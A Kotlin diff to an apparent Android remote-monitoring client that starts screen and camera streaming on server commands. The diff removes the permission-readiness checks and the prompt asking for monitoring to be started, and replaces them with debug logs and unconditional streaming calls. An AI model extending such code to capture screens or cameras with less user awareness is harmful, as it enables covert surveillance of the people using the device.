@@ -63,15 +63,8 @@ object SocketManager {
             socket?.on("start_screen_stream") {
                 Log.d(TAG, "Komut: start_screen_stream")
                 mainHandler.post {
-                    if (!ScreenStreamManager.isProjectionReady()) {
-                        Log.e(TAG, "start_screen_stream: MediaProjection null — kullanıcı izin vermeli")
-                        val err = JSONObject().apply {
-                            put("profileId", Config.profileId)
-                            put("error", "Ekran izni eksik. Android uygulamasını açın ve 'İzlemeyi Başlat' butonuna basın.")
-                        }
-                        socket?.emit("screen_stream_error", err)
-                        return@post
-                    }
+                    Log.d(TAG, "projection hazır mı: ${ScreenStreamManager.isProjectionReady()}")
+                    Log.d(TAG, "startStreaming çağrılıyor...")
                     val m = context.resources.displayMetrics
                     ScreenStreamManager.startStreaming(m.widthPixels, m.heightPixels, m.densityDpi)
                 }
@@ -162,6 +155,7 @@ object SocketManager {
                 signalSocket?.emit("device-register", info)
                 signalSocket?.emit("register", "android")
                 Log.d(TAG, "Cihaz kaydı gönderildi — profileId=${Config.profileId}")
+                Log.d(TAG, "projection hazır mı: ${ScreenStreamManager.isProjectionReady()}")
             }
 
             signalSocket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
@@ -186,16 +180,13 @@ object SocketManager {
                         try {
                             when (type) {
                                 "screen" -> {
+                                    Log.d(TAG, "screen komutu alındı, startStreaming başlatılıyor")
+                                    Log.d(TAG, "projection hazır mı: ${ScreenStreamManager.isProjectionReady()}")
                                     val m = context.resources.displayMetrics
-                                    if (ScreenStreamManager.isProjectionReady()) {
-                                        ScreenStreamManager.startStreaming(
-                                            m.widthPixels, m.heightPixels, m.densityDpi
-                                        )
-                                        Log.d(TAG, "Ekran akışı başlatıldı")
-                                    } else {
-                                        Log.e(TAG, "MediaProjection hazır değil — kullanıcının izin vermesi gerekiyor")
-                                        notifyProjectionNeeded()
-                                    }
+                                    ScreenStreamManager.startStreaming(
+                                        m.widthPixels, m.heightPixels, m.densityDpi
+                                    )
+                                    Log.d(TAG, "startStreaming çağrıldı")
                                 }
                                 "camera" -> {
                                     CameraStreamManager.startStreaming(context)
